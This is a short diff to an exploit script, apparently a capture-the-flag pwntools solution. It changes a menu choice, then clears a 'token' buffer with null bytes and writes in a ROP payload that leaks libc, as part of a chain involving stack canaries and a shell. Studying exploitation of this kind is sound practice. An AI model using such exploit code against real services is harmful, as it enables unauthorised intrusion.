@@ -53,7 +53,7 @@ def hack_vote_ret(canary, base):
     r.recvuntil('>')
     r.sendline('3')
     r.recvuntil('>')
-    r.sendline('3')
+    r.sendline('4')
     recv_str = r.recvuntil('>').split('\n')
     print('and then --> ', recv_str)
 
@@ -162,13 +162,17 @@ def rop_shell(canary, base, libc_base):
     return p
 
 def write_token(p):
-    r.sendlineafter('>', '2')
-    r.sendlineafter('token: ', '\x00' * 0xb8)
+    print('clear token --> ', r.recvuntil('>'))
+    r.sendline('2')
+    print('to clear --> ', r.recvuntil('token: '))
+    r.sendline('\x00' * 0xb8)
     print('finished clearing token')
 
     # write the ROP of leaking libc in token
-    r.sendlineafter('>', '2')
-    r.sendlineafter('token: ', p)
+    print('write new token --> ', r.recvuntil('>'))
+    r.sendline('2')
+    print('to write --> ', r.recvuntil('token: '))
+    r.sendline(p)
     print('finished writing payload token')
 
 def main():
